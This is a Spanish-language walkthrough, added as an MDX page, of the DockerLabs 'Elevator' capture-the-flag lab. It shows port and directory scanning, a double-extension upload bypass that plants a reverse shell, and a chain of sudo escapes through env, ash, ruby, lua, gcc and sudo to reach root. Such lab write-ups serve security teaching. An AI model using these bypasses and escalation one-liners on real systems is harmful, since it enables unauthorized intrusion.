@@ -1,0 +1,300 @@
+---
+title: Elevator
+description: Resolución completa de la máquina virtual *Elevator* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **Elevator**, desarrollada por *beafn28* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
+El laboratorio expone un servidor web con una funcionalidad de subida de archivos que permite el bypass de extensiones mediante doble extensión (`.php.jpg`), permitiendo la subida de una reverse shell y obteniendo acceso como `www-data`.
+Una vez dentro, se identifican múltiples configuraciones inseguras de `sudo` que permiten escalar progresivamente a través de diferentes usuarios del sistema: `www-data` → `daphne` → `vilma` → `shaggy` → `fred` → `scooby` → `root`, encadenando binarios como `env`, `ash`, `ruby`, `lua`, `gcc` y `sudo`.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'Elevator',
+    Autor: 'beafn28',
+    Dificultad: 'Fácil',
+    Fecha: '01/12/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip Elevator.zip
+sudo bash auto_deploy.sh Elevator.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p Elevator/{content,exploits,nmap,scripts}
+cd Elevator
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **80/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1763242302/Ports_mpqdfq.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p80 172.17.0.2 -oN targeted
+```
+
+---
+
+### 1.3 Enumeración web
+
+Se realiza un escaneo de directorios para encontrar posibles endpoints en el servicio del puerto 80:
+
+```bash
+gobuster dir -u http://172.17.0.2/ \
+  -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
+  -x php,html,txt,js -t 200
+```
+
+![Gobuster](https://res.cloudinary.com/dewqswzke/image/upload/v1763242302/Gobuster_tm8uxi.png)
+
+**Rutas detectadas:**
+- `/index.php` — Página principal con temática de ascensor.
+  ![Index](https://res.cloudinary.com/dewqswzke/image/upload/v1763242303/Index_lyjuml.png)
+- `/themes` — Directorio accesible.
+
+Se fuzzea el contenido de `/themes`:
+
+```bash
+gobuster dir -u http://172.17.0.2/themes/ \
+  -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
+  -x php,html,txt,js -t 200
+```
+
+![Gobuster2](https://res.cloudinary.com/dewqswzke/image/upload/v1763242302/Gobuster2_krstyd.png)
+
+**Rutas detectadas en `/themes`:**
+- `/uploads` — Directorio con acceso permitido.
+- `/uploads.php` — Posible manejador de subida.
+- `/archivo.html` — Formulario de subida de archivos.
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Subida de reverse shell
+
+El archivo `archivo.html` permite subir imágenes. El sistema restringe la carga solo a archivos con extensión `.jpg`.
+
+Se prueba un bypass mediante doble extensión: `revShell.php.jpg`. El archivo es aceptado y subido exitosamente.
+
+![File Upload](https://res.cloudinary.com/dewqswzke/image/upload/v1763242302/FileUpload_scf2qf.png)
+
+Se confirma la subida revisando el directorio `/uploads`:
+
+![Uploads](https://res.cloudinary.com/dewqswzke/image/upload/v1763242309/ThemesUploads_yvjrwn.png)
+
+### 2.2 Reverse shell
+
+Se abre un listener en la máquina atacante:
+
+```bash
+nc -nlvp 443
+```
+
+Se accede al payload para activar la reverse shell:
+
+```
+http://172.17.0.2/themes/uploads/revShell.php.jpg
+```
+
+![Reverse shell](https://res.cloudinary.com/dewqswzke/image/upload/v1763242303/Reverse_qaymr0.png)
+
+Acceso inicial obtenido como usuario **www-data**.
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+El CTF simula un ascensor: se debe escalar a cada miembro del equipo de Scooby-Doo hasta llegar a root.
+
+### 3.1 www-data → daphne
+
+Se verifican los permisos sudo:
+
+```bash
+sudo -l
+```
+
+![Sudo -l www-data](https://res.cloudinary.com/dewqswzke/image/upload/v1763242307/Sudo-lWWW-data_xdbzy4.png)
+
+Se ejecuta `env` como `daphne`:
+
+```bash
+sudo -u daphne env /bin/bash
+```
+
+![Daphne](https://res.cloudinary.com/dewqswzke/image/upload/v1763242302/Daphne_hdep0r.png)
+
+---
+
+### 3.2 daphne → vilma
+
+```bash
+sudo -l
+```
+
+![Sudo -l Daphne](https://res.cloudinary.com/dewqswzke/image/upload/v1763242305/Sudo-lDaphne_tbjybj.png)
+
+Se ejecuta `ash` como `vilma`:
+
+```bash
+sudo -u vilma ash
+```
+
+![Vilma](https://res.cloudinary.com/dewqswzke/image/upload/v1763242309/Vilma_vcimkj.png)
+
+---
+
+### 3.3 vilma → shaggy
+
+```bash
+sudo -l
+```
+
+![Sudo -l Vilma](https://res.cloudinary.com/dewqswzke/image/upload/v1763242306/Sudo-lVilma_dqhlni.png)
+
+Se ejecuta `ruby` como `shaggy`:
+
+```bash
+sudo -u shaggy ruby -e 'exec "/bin/bash"'
+```
+
+![Shaggy](https://res.cloudinary.com/dewqswzke/image/upload/v1763242304/Shaggy_t0dutr.png)
+
+---
+
+### 3.4 shaggy → fred
+
+```bash
+sudo -l
+```
+
+![Sudo -l Shaggy](https://res.cloudinary.com/dewqswzke/image/upload/v1763242306/Sudo-lShaggy_lqmws8.png)
+
+Se ejecuta `lua` como `fred`:
+
+```bash
+sudo -u fred lua -e 'os.execute("/bin/bash")'
+```
+
+![Fred](https://res.cloudinary.com/dewqswzke/image/upload/v1763242302/Fred_agpy2q.png)
+
+---
+
+### 3.5 fred → scooby
+
+```bash
+sudo -l
+```
+
+![Sudo -l Fred](https://res.cloudinary.com/dewqswzke/image/upload/v1763242306/Sudo-lFred_narucr.png)
+
+Se ejecuta `gcc` como `scooby`:
+
+```bash
+sudo -u scooby gcc -e -wrapper /bin/bash,-s .
+```
+
+![Scooby](https://res.cloudinary.com/dewqswzke/image/upload/v1763242304/Scooby_vpak1r.png)
+
+---
+
+### 3.6 scooby → root
+
+```bash
+sudo -l
+```
+
+![Sudo -l Scooby](https://res.cloudinary.com/dewqswzke/image/upload/v1763242306/Sudo-lScooby_mobjv0.png)
+
+Se ejecuta `sudo` como root:
+
+```bash
+sudo sudo /bin/bash
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1763242303/Root_ku3bpc.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Bypass de extensión mediante doble extensión (.php.jpg)",
+      severity: "Crítica",
+      impact: "Subida de código ejecutable y RCE como www-data"
+    },
+    {
+      vulnerability: "Exposición del directorio /uploads sin restricciones",
+      severity: "Alta",
+      impact: "Acceso y ejecución de archivos maliciosos subidos"
+    },
+    {
+      vulnerability: "Múltiples configuraciones inseguras de sudo",
+      severity: "Crítica",
+      impact: "Escalada de privilegios progresiva hasta root"
+    },
+    {
+      vulnerability: "Falta de validación de tipo MIME en subida de archivos",
+      severity: "Alta",
+      impact: "Subida de archivos ejecutables maliciosos"
+    },
+    {
+      vulnerability: "Falta de segmentación y aislamiento de usuarios",
+      severity: "Media",
+      impact: "Movimiento lateral facilitado entre cuentas"
+    }
+  ]}
+/>
